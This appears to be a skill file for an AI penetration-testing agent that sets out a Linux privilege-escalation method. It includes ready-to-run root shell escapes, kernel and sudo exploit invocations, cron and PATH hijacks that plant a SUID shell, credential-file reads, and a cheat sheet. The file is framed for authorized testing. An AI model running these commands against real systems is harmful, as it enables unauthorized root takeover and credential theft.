---
name: linux-privesc
description: "Linux privilege escalation methodology: SUID/SGID, sudo misconfig, capabilities, kernel exploits, cron abuse, and PATH hijacking"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["linux privilege escalation", "suid", "sudo misconfig", "capabilities", "kernel exploit", "cron abuse", "path hijacking", "dirty pipe", "dirty cow", "pwnkit", "root escalation", "gtfobins"]
mitreAttack: ["T1548", "T1574", "T1068"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# Linux Privilege Escalation

## When to Use

- You have a low-privilege shell on a Linux system and need to escalate to root
- You are assessing privilege escalation paths during a penetration test
- You found credentials for a non-root user and need to understand the risk
- Testing whether a Linux configuration allows unauthorized elevation

## Do Not Use

- Against production systems without explicit written authorization
- To escalate privileges on systems you do not own or have permission to test
- Using kernel exploits that could cause system instability
- On critical infrastructure where failed exploits cause downtime

## Auth Context

Privilege escalation starts from an existing shell. For web-based initial access, use **httpRequest** with **getCapturedHeaders** for auth context to establish the initial foothold.

---

## Phase 1: Enumeration

### System Information

```bash
uname -a
cat /etc/os-release
cat /proc/version
hostname
id
whoami
groups
sudo -l 2>/dev/null
```

### SUID/SGID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null     # SUID
find / -perm -2000 -type f 2>/dev/null     # SGID
find / -writable -user root 2>/dev/null     # Writable by root
```

### Capabilities

```bash
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid+ep  → become root
# cap_dac_override+ep → read/write any file
# cap_sys_admin+ep → mount filesystems
# cap_sys_ptrace+ep → trace any process
```

### Sudo Misconfigurations

```bash
sudo -l
# Common misconfigs:
# (ALL) NOPASSWD: /usr/bin/vi → shell escape
# (root) /usr/bin/find → -exec /bin/sh \;
# (root) /usr/bin/env → /bin/sh
# (root) /usr/bin/python → import os; os.system("/bin/sh")
```

### Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
crontab -l
find /etc/cron* -writable 2>/dev/null
```

### Network and Services

```bash
ss -tlnp
netstat -tlnp
ps aux | grep root
lsof -u root
env
cat /proc/*/environ 2>/dev/null | tr '\0' '\n'
```

---

## Phase 2: Exploitation

### SUID Exploitation (GTFOBins)

```bash
# vim
vim -c ':!/bin/sh'

# find
find . -exec /bin/sh \; -quit

# python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# bash
bash -p

# less
less /etc/passwd  # then !/bin/sh

# awk
awk 'BEGIN {system("/bin/sh")}'

# env
env /bin/sh

# perl
perl -e 'exec "/bin/sh";'
```

### Capability Exploitation

```bash
# cap_setuid on python
python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_dac_override — read /etc/shadow
cat /etc/shadow
```

### Sudo Exploitation

```bash
# Baron Samedit (CVE-2021-3156) — sudo before 1.9.5p2
sudoedit -s '\' $(python -c 'print("A"*65536)')
```

### Kernel Exploits

```bash
# DirtyPipe (CVE-2022-0847) — Linux 5.8 to 5.16.11
./dirtypipe /etc/passwd 1 "root::0:0:root:/root:/bin/bash"

# DirtyCow (CVE-2016-5195) — Linux 2.6.22+
./dirtycow

# PwnKit (CVE-2021-4034) — polkit
./pwnkit
```

### Cron Job Exploitation

```bash
# If cron runs a script you can write to:
echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /etc/cron.d/evil.sh

# PATH hijacking
echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /tmp/backup.sh
chmod +x /tmp/backup.sh
export PATH=/tmp:$PATH
```

### Docker Group Escape

```bash
docker run -v /:/host -it alpine chroot /host bash
```

---

## Cheat Sheet — Quick Reference

| Vector | Command |
|--------|---------|
| SUID vim | `vim -c ':!/bin/sh'` |
| SUID find | `find . -exec /bin/sh \; -quit` |
| SUID python | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| SUID bash | `bash -p` |
| Sudo vi | `sudo vi -c ':!sh'` |
| Sudo find | `sudo find / -exec /bin/sh \; -quit` |
| cap_setuid | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| DirtyPipe | `./dirtypipe /etc/passwd 1 "root:..."` |
| Docker group | `docker run -v /:/host -it alpine chroot /host bash` |

---

## Anti-Hallucination

- Always verify kernel version before attempting kernel exploits — mismatched versions cause panics
- GTFOBins is the authoritative reference for SUID/sudo exploitation
- Some SUID binaries are intentionally set (passwd, su) — focus on unexpected ones
- Document the exact binary path and permissions for each finding
- A capability listed by getcap is not automatically exploitable — verify the context
